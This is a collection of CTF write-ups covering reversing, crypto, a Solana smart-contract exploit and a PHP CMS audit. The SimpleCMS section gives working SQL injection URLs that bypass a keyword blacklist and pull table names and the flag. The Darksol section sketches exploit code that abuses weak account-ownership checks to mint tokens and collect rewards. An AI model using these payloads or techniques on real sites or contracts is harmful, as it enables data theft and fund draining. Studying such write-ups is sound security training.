先要做一个custom encrypt提前生成好n，以免tmp\_buf上的文件内容在生成n时被覆盖，这就是一个多组公钥加密同一明文的问题了，e取5（3的话互质要求有点难达到，5就好多了），拿5组（n，c），中国剩余定理，再算个5次方根，即可获得文件内容



### File: ctfs/2018/n1ctf-2018/re/baby_neural_network/README.md

看数据段可知有5个bias层5个weight层，以及一个predictions数组，可以看出是用输入经过一个预设好的模型获得一个输出，和predictions比较，相符则正确，x一下root\_scope，可以看出这个模型是包括了5次forward过程，每次都对上一层的结果乘上一个矩阵（weight层），再加一个矢量（bias层），再进行一次sigmoid运算。完全可逆，对predictions做一下逆运算即可获得flag



### File: ctfs/2018/n1ctf-2018/re/lfi/README.md

给的是luajit的字节码文件，用工具ljd进行反编译（原本的代码有bug，需要修补一下才能正常反编译），可以看到func1用到了一个`11*16*256`数组和一个`4*256*4`数组，对一个给定的16字节明文（havefun...）进行了对称加密，猜测是白盒AES加密。func2是即时加载的，有一个很长的数组逐个和42异或，得到一个另一个luac文件的内容，符号给的很清晰，逆向可知func2是以输入作为key对一个给定的16字节明文（依然是havefun那个）进行AES加密。于是本题的目标就是实现AES key schedule的逆运算。先从xortable（`11*16*256`数组）恢复出第二轮的轮密钥，由于第一轮的轮密钥是全0，所以事实上第二轮的轮密钥就是flag字符的一个重排，于是再排回来就是flag了



### File: ctfs/2018/starctf-2018/re/BabyDroid/README.md

jeb看java代码发现调用了check0，check0函数在liba.so中定义，而liba.so加载时也会加载libb.so，check0会调用check函数，此外还会注册一个stringfromJNI函数，返回值是liba.so的类似crc的一个校验值，check函数则在libb.so中定义，libb.so被加了壳，乱找发现ed8函数会执行脱壳操作，用libb.so的类似crc的一个校验值异或0xab8-0xed8的数据，通过观察这个区域内数据和指令的可能取值猜测出这个校验值为`*ctf`，于是可脱壳，之后发现jni\_onload函数解密了三个字符串，从而注册了check函数，然后再进行了一次脱壳操作，异或的key依然是`*ctf`，于是再次脱壳，获得check函数的指令，发现它会对输入异或上`*ctf`的平方再与一个硬编码字符串比较，不相等就exit，于是解密一下，即可获得flag



### File: ctfs/2018/starctf-2018/re/wasm/README.md

用wasmdec工具解析获得代码和数据，硬看，发现输入长度应为24，用魔改的tea加密（移4改为移3，有的地方的加法改成了异或），密钥是`webasmintersting`，得到的密文和一个硬编码数组8字节反序比较，于是据此解出flag



### File: ctfs/2018/wctf-2018/crypto/rsa/README.md

In this chall we are provided with a website. We input our username and get a binary. "generate.exe" and "generate1.exe" are two binarys generated by different usernames. The core point is Meet-In-The-Middle attack.



### File: ctfs/2022/darksol/README.md

# justCTF 2022 Dark SOLs Writeup

## Challenge description

Brave Undead, you have proven yourself to me. Now, be one, with the Dark...

– [Nashandra](https://darksouls.fandom.com/wiki/Nashandra#:~:text=%22Brave%20Undead%2C%20you,%E2%80%94%20Nashandra)
```bash
nc darksols.nc.jctf.pro 1337
```

[Attachment](/release/darksols.zip): md5sum e3b74cfc83a0115e183d510f4f1dbc08

> I solve this challenge after the game ended.

## Analysis

By inspecting the challenge server's logic in [main.rs](source/darksols/src/main.rs#L236-L243), it is clear that the target of this challenge is to get 50000 lamports using the user account provided, whose initial balacne is 20 lamports. What's more, there are two programs already deployed except our solve program: [`darksols`](source/darksols/src/main.rs#L75) program and the [`evil-contract`](source/darksols/src/main.rs#L76) program. The `darksols` program contains a bunch of instructions that need further inspection, which must be the victim program. The `evil-contract` program is composed of [a single instrustion](source/evil-contract/src/evil-contract/evil-contract.c#L4-L18), whose job is to call the second account passed in as an executable program, using the remaining three accounts as the account list. Well, this does not make any sense at first glance. If I must call a program, I can just directly invoke the target in my own solve program, and this `evil-contract` remains unused. I cannot figure out how to use this given `evil-contract` at first, but I guess I might somewhere need it in the final exploit.

After deploying these two programs, there comes [some transcations](source/darksols/src/main.rs#L118) that initialize the environment and the darksol program. It sets the initial balance of the user account(20 lamports) and the vault account(1000000+ lamports), and creates two spl-token accounts, one is called `item` account and the other called `item` account.

Spl-token accounts are special accounts in Solana system. It is used to implement the `ERC20 Token` concept in the Ethereum ecosystem. The vital knowledge about this kind of account is its [Account structure](source/darksols/spl-token/src/state.rs#107-L116).

- The `mint` field shows which kind of token it belongs to, `item` token or `item1337` token in the case of this challenge. More information about this token, like the `mint_authority` or `total_supply`, is stored in the Mint Account it points to.
- The `amount` field shows how much amount of token is contained in this particular spl-token account.
- The `owner` field, obviously, shows who owns such amount of such token.

The `owner` field of spl-token accounts and the `owner` of Solana accounts are not the same concept. The `owner` of a Solana account is a system wide concept, denotes which account can modify the contents of this account. The `owner` field of spl-token accounts is just some data stored in a Solana account whose owner is the system spl-token program. Only the spl-token program can edit spl-token accounts. For more information on this, please refer to [Solana official documents](https://spl.solana.com/token)

```rust
pub struct Account {
    /// The mint associated with this account
    pub mint: Pubkey,
    /// The owner of this account.
    pub owner: Pubkey,
    /// The amount of tokens this account holds.
    pub amount: u64,
}

pub struct Mint {
    /// Optional authority used to mint new tokens. The mint authority may only be provided during
    /// mint creation. If no mint authority is present then the mint has a fixed supply and no
    /// further tokens may be minted.
    pub mint_authority: COption<Pubkey>,
    /// Total supply of tokens.
    pub supply: u64,
    /// Number of base 10 digits to the right of the decimal place.
    pub decimals: u8,
    /// Is `true` if this structure has been initialized
    pub is_initialized: bool,
    /// Optional authority to freeze token accounts.
    pub freeze_authority: COption<Pubkey>,
}
```

At the [end](source/darksols/src/main.rs#155) of the initialization, the `darksol` program's `INITIALIZE` [instruction](source/programs/src/darksols/darksols.c#398) is called. After some crital checks on the input accounts, it creates a `weapon` account, mint some tokens to two certain account, create another `sanity` account, and finally write the address of provided spl-token program into the `sanity` account.

```c
uint64_t handle_initialize(SolParameters* params) {
  ...
  create_weapons_account(params, payer, weapons);

  mint_to(params, mint, item, authority, 100);
  mint_to(params, mint_1337, item_1337, authority, 1);
  ...
  create_sanity_account(params, payer, sanity_acc);
  Sanity* temp = (Sanity*) sanity_acc->data;
  sol_memcpy(&temp->token, token->key, sizeof(SolPubkey));
}
```

Okay, have no idea what's going on right now. Let's look at the remaining instructions to figure out what this program want us to do. The `handle_create_player` seems an initialization operation as well, so I dive into this function next. After a bunch of checks on the input accounts, as usual, it creates a `player` account, initialize its relevant fields, create two spl-token accounts for the player, transfers some lamports into these two accounts, and finally initializes the two spl-token account.

The two `transfer()` function below is not transferring tokens, but rent fee that is mandatory to keep these two accounts alive. So after this `create_player` initialization, the two spl-token accounts for the player, one called `solve_item` account and the other `solve_item_1337` account, both has 0 token in it.

```c
uint64_t handle_create_player(SolParameters* params){
  ...
  create_player_account(params, payer, player_acc);
  Player* player = (Player*)player_acc->data;
  player->health = 0xff;
  player->mana = 0xff;
  const char* name = (const char*)(params->data + 9);
  sol_memcpy(player->name, name, 30);

  create_player_token_account(params, payer, solve_item, token->key, acct_seed, ITEM_TOKEN_SEED);
  create_player_token_account(params, payer, solve_item_1337, token->key, acct_seed_1337, ITEM_1337_TOKEN_SEED);

  transfer(params, vault, solve_item, MINIMUM_BALANCE);
  transfer(params, vault, solve_item_1337, MINIMUM_BALANCE);

  initialize_account(params, mint, solve_item, authority);
  initialize_account(params, mint_1337, solve_item_1337, authority);
}
```

The picture is still blurred at this time. I have to check the function `handle_fight` next. It first calculated a `player_attack` amount, according to the `solve_item` account's remaining token amount. There are two kinds of weapon available: the `item` spl-token associated weapon has attack value 1, and the `item1337` spl-token associated weapon has attack value 0x1337. Then we choose which monster to attack, and how many times to attack. In the end, certain reward for our fight is transferred back, in lamports.

```c
uint64_t handle_fight(SolParameters* params){
  SolAccountInfo* solve_item = &params->ka[3];
  Account* account = (Account*)solve_item->data;
  ...
  uint64_t player_attack = account->amount * weapon.attack;

  Monster monsters[9] = {
    { .attack = 1,      .reward = 1 },
    { .attack = 2,      .reward = 1 },
    { .attack = 4,      .reward = 2 },
    { .attack = 8,      .reward = 2 },
    { .attack = 16,     .reward = 3 },
    { .attack = 32,     .reward = 3 },
    { .attack = 64,     .reward = 4 },
    { .attack = 128,    .reward = 4 },
    { .attack = 0x1337, .reward = 0xd337 }
  };

  FightInstr* fight_instr = (FightInstr*)(params->data + 4);
  Monster monster = monsters[fight_instr->monster];
  uint64_t needed_health = 0;
  if (monster.attack > player_attack) {
    needed_health = (monster.attack - player_attack) * fight_instr->number;
  }
  uint64_t needed_mana = fight_instr->number;
  sol_assert(player->health >= needed_health);
  sol_assert(player->mana >= needed_mana);
  player->health -= needed_health;
  player->mana -= needed_mana;

  transfer(params, vault, payee, monster.reward * fight_instr->number);
}

```

The other two instrctions `handle_buy()` and `handle_sell()` can be simply taken as swapping between Solana lamports and spl-tokens, at 1 lamport to 1 `item` token and 0x1337 lamports to 1 `item1337` token ratio.

In order to earn 50000 lamports, we have to fight the monster whose attack value is 0x1337, and its reward is 0xd337(54071), which is enought to solve this challenge. But user only has 20 lamports at hand, who cannot afford to buy one `item1337` token to be able to fight the monster 1337.


## Unintended Solve 1

I studied the evil contract for a long time and think that players are supposed to somewhat fake the sanity account to point to this evil contract. But I just cannot figure out how to do that. I thought faking a sanity account which is owned by the program must use the given `initialize()` function in the `darksol` program, but in the `mint_to()` function it will pass 3 accounts to spl token account, which is not doable as the evil-contract accepts excatly 4 accounts.

But I somewhat do find that I can call the `initialize()` function as least, although the spl-token account must remains the system token account.

An idea occured to me that maybe I can use this `mint_to()` in `initialize()` to mint item1337 tokens to the player's iterm1337 account, and that is doable. I pass two `FAKE_SANITY` and `FAKE_WEAPON` to conform the `create_weapons_account` and `create_sanity_account` not to complain about account already exist error, and successfully mint one item1337 to the player's spl-account.

```c
uint64_t hacker(SolParameters *params)
{
  sol_assert(params->ka_num == ACCOUNT_CNT);
  sol_log("[+] About to pwn !");
  create_fake_player(params);
  initialize(params);
  fight(params);
  sol_log("[+] pwned !");
  return SUCCESS;
}
```

Then I just directly call the `fight` instruction to kill the monster 0x1337 and get the reward.

Relevant solve scripts lies in folder [sovle1](/solve1/). 

## Unintended Solve 2

I thought on the idea of faking the player's `solve_item` account and `solve_item_1337` account for a while. And I rechecked the `handle_fight` to see how it checks all its input accounts. I paid special attention on the `solve_item` address passed in, and surprisedly find that it only checks the spl-token's `owner` is the `authority`. 


```c
uint64_t handle_fight(SolParameters* params){
  SolAccountInfo* solve_item = &params->ka[3];
  ...
  Account* account = (Account*)solve_item->data;
  ...
  sol_assert(SolPubkey_same(&account->owner, authority->key));
  ...
}
```

That being said, I can directly use the origin `item1337` token account, which already has 1 `item1337` token in it, to fight and kill the monster1337.

```c
uint64_t hacker(SolParameters *params)
{
  sol_assert(params->ka_num == ACCOUNT_CNT);
  sol_log("[+] About to pwn !");
  create_player(params);
  fight1337(params);
  sol_log("[+] pwned !");
  return SUCCESS;
}
```

Relevant solve scripts lies in folder [sovle2](/solve2/). 

## Intended Solve

I finally come up with the intended solution, aka, using the `evil-contract`. It is correct that we need to fake the `sanity` account to the address of `evil-contract`. After that, we can get 1 `item1337` token by calling `sell()` instruction, which will delegate the call to the `evil-contarct`, which then swap the account order and call the `spl-token` program.

But how to? We cannot use the `initialize` function, which is the only place to edit the `sanity` account.

Some [checks](source/programs/src/darksols/darksols.c#L187) on the size of the `sanity` account serves as hint to me.

```c
sol_assert(sanity_acc->data_len == sizeof(Sanity));
```

I must find some data structure who has the same size of the `Sanity` structure(32 bytes), and it turns out that the `Player` struct comes to rescue.

```c
typedef struct {
  uint8_t health;
  uint8_t mana;
  char name[30];
} Player;
```

It is now clear that the length of the `name` buffer is carefully prepared just to make its size equal to 32 bytes. This `Player` account is owned by the program, and can pass all the checks on the original `sanity` account.

We just need to copy the last 30 bytes of pubkey of `evil-contract`(which is fixed) into the name buffer and use `fight` function to adjust the first two bytes until it equals to the first two bytes of the pubkey of `evil-contract`.

```c
uint64_t hacker(SolParameters *params)
{
  sol_assert(params->ka_num == ACCOUNT_CNT);
  sol_log("[+] About to pwn !");
  create_player(params);
  fight_to_sanity_health(params);
  buy(params);
  fight_to_sanity_mana(params);

  /* now player account can be used as sanity account
     use sell instruction to get 1 item1337 token */
  get_1337(params);

  /* now fight the 1337 monster and get the reward */
  fight1337(params);

  sol_log("[+] pwned !");
  return SUCCESS;
}
```
Relevant solve scripts lies in folder [sovle3](/solve3/). 

## Flag

`justCTF{if_y0u_m1ss_1t,_y0u_mu5t_b3_bl1nd!}`

## Side Notes

You can see it is really hard to write a **correct** and **secure** Solana program. There are just too many pitfalls in the Solana programming model, especailly you need to have careful checks on every account inputted, often take their logical relations into account. 


### File: ctfs/README.md

# ctfs
All ctf challs and scripts (and writeup, maybe) from 0ops.

(Some old challs may only have Chinese writeups or their scripts may be lost. We'll try to avoid that in future CTFs)



### File: ctfs/2018/codegate-quals-2018/web/SimpleCMS/index.md

This chanllage is a typical CMS source code audit.

Accordind to source code, flag is in ``{table_prefix}flag.{blind_column}4``, but ``{table_prefix}`` and ``{blind_column}`` is unknown.

This cms don't use pre-compiled technology, but use addslash and blacklist as below.

```php
<?php 
    if(!defined('simple_cms')) exit();

    $method = $_SERVER['REQUEST_METHOD'];

    if($method !== 'GET' && $method !== 'POST'){
            exit('are you hacker?');
    }

    $filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into');

    function escape_str($array)
    {
        if(is_array($array)) {
            foreach($array as $key => $value) {
                if(is_array($value)) {
                    $array[$key] = escape_str($value);
                } else {
                    $array[$key] = filter($value);
                }
            }
        } 
        else {
            $array = filter($array);
        }
        return $array;
    }
    function filter($str){
        global $filter_str;

        foreach ($filter_str as $value) {
            if(stripos($str, $value) !== false){
                die('are you hacker?');
            }
        }
        return addslashes($str);
    }

    $_GET = escape_str($_GET);
    $_POST = escape_str($_POST);
    $_COOKIE = escape_str($_COOKIE);
    $_REQUEST = escape_str($_REQUEST);  
?>
```

After looking at source code, I found the following code is weird, seems we can inject via ``search``.

```php
function action_search(){
    $column = Context::get('col');
    $search = Context::get('search');
    $type = strtolower(Context::get('type'));
    $operator = 'or';
    
    if($type === '1'){
        $operator = 'or';
    }
    else if($type === '2'){
        $operator = 'and';
    }
    if(preg_match('/[\<\>\'\"\\\'\\\"\%\=\(\)\/\^\*\-`;,.@0-9\s!\?\[\]\+_&$]/is', $column)){
        $column = 'title';
    }
    $query = get_search_query($column, $search, $operator);
    $result = DB::fetch_multi_row('board', '', '', '0, 10','date desc', $query);
    include(CMS_SKIN_PATH . 'board.php');
}
```

In this code, ``\n`` will trigger a syntax error.

```
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%23
```

Then we try to use ``mysql`` db to get ``{table_prefix}``.

```
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%3C0%20union%20select%201,(select%20table_name%20from%20mysql.innodb_table_stats%20limit%202,1),3,4,5%23
```

At last, we can use ``join`` to get flag.

```
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0A)%3C0%20union%20(select%201,t.*%20from%20mysql.user%20join%2041786c497656426a6149_flag%20t)%23
```


### File: ctfs/2018/hctf-quals-2018/blockchain/ez2win/exp.md

## ez2win

调用_transfer，从owner转钱过来，再payforflag





### File: ctfs/2022/darksol/source/darksols/spl-token/program-id.md

TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA



### File: ctfs/todo.md

* 2018-n1ctf-rsa\_radding ---- polaris

